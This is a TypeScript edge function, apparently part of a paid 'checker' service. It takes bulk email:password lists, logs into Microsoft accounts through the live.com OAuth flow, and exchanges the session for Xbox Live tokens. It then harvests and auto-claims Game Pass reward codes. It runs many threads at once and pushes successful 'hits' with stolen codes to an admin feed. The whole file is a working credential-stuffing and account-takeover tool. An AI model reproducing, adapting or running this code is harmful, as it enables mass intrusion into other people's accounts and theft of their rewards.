import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, verifyFirebaseIdToken, firebaseGet } from "../_shared/firebase-admin.ts";
import { broadcastProgress } from "../_shared/realtime-broadcast.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

interface FetchRequest {
  accounts: string[];
  threads?: number;
  username?: string;
  sessionId?: string;
}

interface FetchResult {
  email: string;
  status: 'success' | 'no_codes' | 'auth_failed' | 'login_failed' | 'xbox_tokens_failed' | 'error';
  codes: string[];
  message: string;
}

function getCanaryTimestamp(): string {
  const now = new Date();
  const day = now.toLocaleDateString('en-US', { weekday: 'short' });
  const date = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const ms = now.getMilliseconds().toString().padStart(3, '0');
  return `[${day} ${date} ${time}.${ms}]`;
}

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const minutes = Math.floor(ms / 60000);
  const seconds = ((ms % 60000) / 1000).toFixed(1);
  return `${minutes}m ${seconds}s`;
}

function log(msg: string): void {
  console.log(`${getCanaryTimestamp()} ${msg}`);
}

class CookieJar {
  private cookies: Map<string, string> = new Map();

  extractFromHeaders(headers: Headers): void {
    try {
      const setCookies = (headers as any).getSetCookie?.() || [];
      for (const cookie of setCookies) {
        this.parseCookie(cookie);
      }
    } catch {
      const setCookieHeader = headers.get('set-cookie');
      if (setCookieHeader) {
        const cookies = setCookieHeader.split(/,(?=\s*[^;,]+=[^;,]+)/);
        for (const cookie of cookies) {
          this.parseCookie(cookie);
        }
      }
    }
  }

  private parseCookie(cookieStr: string): void {
    const parts = cookieStr.split(';')[0].trim();
    const eqIndex = parts.indexOf('=');
    if (eqIndex > 0) {
      const name = parts.substring(0, eqIndex).trim();
      const value = parts.substring(eqIndex + 1).trim();
      if (name && value) {
        this.cookies.set(name, value);
      }
    }
  }

  toString(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  }
}

async function getOAuthPage(cookies: CookieJar): Promise<{ ppft: string | null; urlPost: string | null }> {
  const oauthUrl = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en';

  try {
    const response = await fetch(oauthUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      redirect: 'manual',
    });

    cookies.extractFromHeaders(response.headers);
    const text = await response.text();

    const ppftMatch = text.match(/name="PPFT"[^>]*value="([^"]+)"/i) ||
                      text.match(/sFT:'([^']+)'/) ||
                      text.match(/sFT:"([^"]+)"/);
    const ppft = ppftMatch ? ppftMatch[1] : null;

    const urlPostMatch = text.match(/urlPost:'([^']+)'/) ||
                         text.match(/urlPost:"([^"]+)"/) ||
                         text.match(/"urlPost":"([^"]+)"/);
    const urlPost = urlPostMatch ? urlPostMatch[1].replace(/\\/g, '') : null;

    return { ppft, urlPost };
  } catch (e) {
    log(`OAuth page error: ${e}`);
    return { ppft: null, urlPost: null };
  }
}

async function submitLogin(email: string, password: string, ppft: string, urlPost: string, cookies: CookieJar): Promise<string | null> {
  try {
    const formData = new URLSearchParams({
      'login': email,
      'loginfmt': email,
      'passwd': password,
      'PPFT': ppft,
      'PPSX': 'Passpor',
      'NewUser': '1',
      'LoginOptions': '1',
      'type': '11',
      'i13': '0',
      'i21': '0',
    });

    let currentUrl = urlPost;

    for (let i = 0; i < 10; i++) {
      const response = await fetch(currentUrl, {
        method: i === 0 ? 'POST' : 'GET',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Cookie': cookies.toString(),
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
        body: i === 0 ? formData.toString() : undefined,
        redirect: 'manual',
      });

      cookies.extractFromHeaders(response.headers);
      const location = response.headers.get('location');

      if (location) {
        if (location.includes('access_token=')) {
          const url = new URL(location);
          const fragment = url.hash.substring(1);
          const params = new URLSearchParams(fragment);
          const accessToken = params.get('access_token');
          if (accessToken) return accessToken;
        }
        currentUrl = location;
      } else {
        const text = await response.text();
        if (text.includes('access_token')) {
          const match = text.match(/access_token=([^&"]+)/);
          if (match) return match[1];
        }
        break;
      }
    }

    return null;
  } catch (e) {
    log(`Login error: ${e}`);
    return null;
  }
}

async function getXboxTokens(rpsToken: string): Promise<{ uhs: string | null; xstsToken: string | null }> {
  try {
    const userAuthResponse = await fetch('https://user.auth.xboxlive.com/user/authenticate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-xbl-contract-version': '1',
        'User-Agent': 'okhttp/4.12.0',
      },
      body: JSON.stringify({
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT',
        Properties: {
          AuthMethod: 'RPS',
          SiteName: 'user.auth.xboxlive.com',
          RpsTicket: rpsToken,
        },
      }),
    });

    if (userAuthResponse.status !== 200) {
      return { uhs: null, xstsToken: null };
    }

    const userAuthData = await userAuthResponse.json();
    const userToken = userAuthData.Token;

    if (!userToken) return { uhs: null, xstsToken: null };

    const xstsResponse = await fetch('https://xsts.auth.xboxlive.com/xsts/authorize', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-xbl-contract-version': '1',
        'User-Agent': 'okhttp/4.12.0',
      },
      body: JSON.stringify({
        RelyingParty: 'http://xboxlive.com',
        TokenType: 'JWT',
        Properties: {
          UserTokens: [userToken],
          SandboxId: 'RETAIL',
        },
      }),
    });

    if (xstsResponse.status !== 200) return { uhs: null, xstsToken: null };

    const xstsData = await xstsResponse.json();
    return {
      uhs: xstsData.DisplayClaims?.xui?.[0]?.uhs || null,
      xstsToken: xstsData.Token || null,
    };
  } catch (e) {
    log(`Xbox tokens error: ${e}`);
    return { uhs: null, xstsToken: null };
  }
}

async function fetchCodes(uhs: string, xstsToken: string): Promise<string[]> {
  const codes: string[] = [];
  const auth = `XBL3.0 x=${uhs};${xstsToken}`;

  const endpoints = [
    'https://profile.gamepass.com/v2/offers',
    'https://profile.gamepass.com/v2/rewards',
  ];

  for (const endpoint of endpoints) {
    try {
      const response = await fetch(endpoint, {
        method: 'GET',
        headers: {
          'Authorization': auth,
          'Content-Type': 'application/json',
          'User-Agent': 'okhttp/4.12.0',
        },
      });

      if (response.status === 200) {
        const data = await response.json();

        if (data.offers && Array.isArray(data.offers)) {
          for (const offer of data.offers) {
            if (offer.resource && offer.resource.length > 10) {
              codes.push(offer.resource);
            }

            if (offer.offerStatus === 'available' && offer.offerId) {
              try {
                const cv = Array.from({ length: 22 }, () =>
                  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]
                ).join('') + '.0';

                const claimResponse = await fetch(`https://profile.gamepass.com/v2/offers/${offer.offerId}`, {
                  method: 'POST',
                  headers: {
                    'Authorization': auth,
                    'Content-Type': 'application/json',
                    'User-Agent': 'okhttp/4.12.0',
                    'ms-cv': cv,
                  },
                  body: '',
                });

                if (claimResponse.status === 200) {
                  const claimData = await claimResponse.json();
                  if (claimData.resource && claimData.resource.length > 10) {
                    codes.push(claimData.resource);
                  }
                }
              } catch {
                // Ignore
              }
            }
          }
        }
      }
    } catch (e) {
      log(`Endpoint error: ${e}`);
    }
  }

  return [...new Set(codes)];
}

async function processAccount(email: string, password: string, idx: number, total: number): Promise<FetchResult> {
  const cookies = new CookieJar();

  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const { ppft, urlPost } = await getOAuthPage(cookies);

      if (!ppft || !urlPost) {
        if (attempt === 1) {
          return { email, status: 'auth_failed', codes: [], message: `[${idx}/${total}] ❌ ${email.substring(0, 25)}... - OAuth failed` };
        }
        await new Promise(r => setTimeout(r, 1000));
        continue;
      }

      const rpsToken = await submitLogin(email, password, ppft, urlPost, cookies);

      if (!rpsToken) {
        if (attempt === 1) {
          return { email, status: 'login_failed', codes: [], message: `[${idx}/${total}] ❌ ${email.substring(0, 25)}... - Login failed` };
        }
        await new Promise(r => setTimeout(r, 1000));
        continue;
      }

      log(`[${idx}/${total}] ✅ ${email.substring(0, 25)}... - Got RPS token`);

      const { uhs, xstsToken } = await getXboxTokens(rpsToken);

      if (!uhs || !xstsToken) {
        if (attempt === 1) {
          return { email, status: 'xbox_tokens_failed', codes: [], message: `[${idx}/${total}] ❌ ${email.substring(0, 25)}... - Xbox tokens failed` };
        }
        await new Promise(r => setTimeout(r, 1000));
        continue;
      }

      const codes = await fetchCodes(uhs, xstsToken);

      if (codes.length > 0) {
        return { email, status: 'success', codes, message: `[${idx}/${total}] ✅ ${email.substring(0, 25)}... - ${codes.length} codes!` };
      } else {
        return { email, status: 'no_codes', codes: [], message: `[${idx}/${total}] ⚠️ ${email.substring(0, 25)}... - Working, no codes` };
      }
    } catch (e) {
      if (attempt === 1) {
        return { email, status: 'error', codes: [], message: `[${idx}/${total}] ❌ ${email.substring(0, 25)}... - Error` };
      }
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  return { email, status: 'error', codes: [], message: `[${idx}/${total}] ❌ ${email.substring(0, 25)}... - All attempts failed` };
}

// Background processing function
async function processAccountsBackground(
  parsedAccounts: { email: string; password: string }[],
  threads: number,
  sessionId: string,
  userId: string | null,
  username: string | null
): Promise<void> {
  const startTime = Date.now();
  const results: FetchResult[] = [];
  const total = parsedAccounts.length;
  
  log(`Background processing ${total} accounts with ${threads} threads...`);

  // Process in batches with concurrency control
  let currentIndex = 0;
  
  async function worker(): Promise<void> {
    while (true) {
      const idx = currentIndex++;
      if (idx >= total) break;
      
      const acc = parsedAccounts[idx];
      
      // Broadcast "checking" status
      await broadcastProgress(sessionId, {
        index: idx + 1,
        total,
        email: acc.email,
        status: 'checking',
        message: `[${idx + 1}/${total}] 🔍 Checking ${acc.email}...`,
        timestamp: Date.now()
      }).catch(() => {});
      
      const result = await processAccount(acc.email, acc.password, idx + 1, total);
      results[idx] = result;
      
      // Broadcast result
      await broadcastProgress(sessionId, {
        index: idx + 1,
        total,
        email: acc.email,
        status: result.status === 'success' ? 'success' : result.status === 'no_codes' ? 'no_codes' : 'failed',
        message: result.message,
        timestamp: Date.now()
      }).catch(() => {});
      
      // Log progress every 10 accounts
      if ((idx + 1) % 10 === 0 || idx + 1 === total) {
        const success = results.filter(r => r?.status === 'success').length;
        const noCodes = results.filter(r => r?.status === 'no_codes').length;
        log(`Progress: ${idx + 1}/${total} | Success: ${success} | No Codes: ${noCodes}`);
      }
    }
  }

  await Promise.all(Array(Math.min(threads, total)).fill(null).map(() => worker()));

  const duration = formatDuration(Date.now() - startTime);
  const stats = {
    total: results.length,
    success: results.filter(r => r?.status === 'success').length,
    noCodes: results.filter(r => r?.status === 'no_codes').length,
    authFailed: results.filter(r => r?.status === 'auth_failed').length,
    loginFailed: results.filter(r => r?.status === 'login_failed').length,
    xboxFailed: results.filter(r => r?.status === 'xbox_tokens_failed').length,
    error: results.filter(r => r?.status === 'error').length,
    totalCodes: results.reduce((sum, r) => sum + (r?.codes?.length || 0), 0),
  };

  log(`═══════════════════════════════════════════════`);
  log(`COMPLETE | Duration: ${duration} | Success: ${stats.success} | Codes: ${stats.totalCodes}`);

  // Broadcast completion
  await broadcastProgress(sessionId, {
    index: total,
    total,
    email: 'COMPLETE',
    status: 'success',
    message: `✅ Done! ${stats.success} with codes, ${stats.noCodes} no codes in ${duration}`,
    timestamp: Date.now()
  }).catch(() => {});

  // Save FULL results (including all codes) to Firebase history
  if (userId) {
    // Filter non-null results and create full result entries
    const fullResults = results.filter(r => r != null).map(r => ({
      email: r.email,
      status: r.status,
      codes: r.codes || [],
      message: r.message
    }));

    await firebasePush(`users/${userId}/checkHistory`, { 
      service: "xbox_fetcher", 
      inputCount: total, 
      stats, 
      results: fullResults,
      duration,
      createdAt: new Date().toISOString() 
    }).catch(e => log(`Failed to save history: ${e}`));
    
    // Push live hits for admin feed (limit to 20)
    const hits = results.filter(r => r?.status === 'success' && r.codes.length > 0);
    for (const hit of hits.slice(0, 20)) {
      await firebasePush('adminData/liveHits', { 
        service: 'xbox_fetcher', 
        username: username || 'anon', 
        hitData: { email: hit.email, codes: hit.codes }, 
        createdAt: Date.now() 
      }).catch(() => {});
    }
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders });
  }

  try {
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;

    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) userId = tokenData.uid;
    }

    const { accounts, threads = 5, username, sessionId }: FetchRequest = await req.json();

    log(`═══════════════════════════════════════════════`);
    log(`XBOX FETCHER - BACKGROUND MODE`);
    log(`User: ${username || 'anon'} | Accounts: ${accounts?.length || 0} | Threads: ${threads}`);

    if (!accounts || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "Accounts required" }), 
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("xbox_fetcher") || userData?.services?.includes("all") || userData?.isAdmin;
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "No access to this service" }), 
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    const parsedAccounts = accounts.map(acc => {
      const parts = acc.split(':');
      return { email: parts[0]?.trim() || '', password: parts.slice(1).join(':').trim() };
    }).filter(acc => acc.email && acc.password);

    if (parsedAccounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No valid accounts" }), 
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const jobSessionId = sessionId || `xbox-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;

    // Start background processing - DON'T AWAIT
    EdgeRuntime.waitUntil(
      processAccountsBackground(parsedAccounts, Math.min(threads, 20), jobSessionId, userId, username)
        .catch(error => {
          console.error(`${getCanaryTimestamp()} Background error:`, error);
        })
    );

    // Return immediately with job info
    return new Response(
      JSON.stringify({ 
        status: "processing",
        sessionId: jobSessionId,
        total: parsedAccounts.length,
        message: `Started processing ${parsedAccounts.length} accounts. Watch the live feed for progress.`
      }), 
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    log(`Error: ${error}`);
    return new Response(
      JSON.stringify({ error: String(error) }), 
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
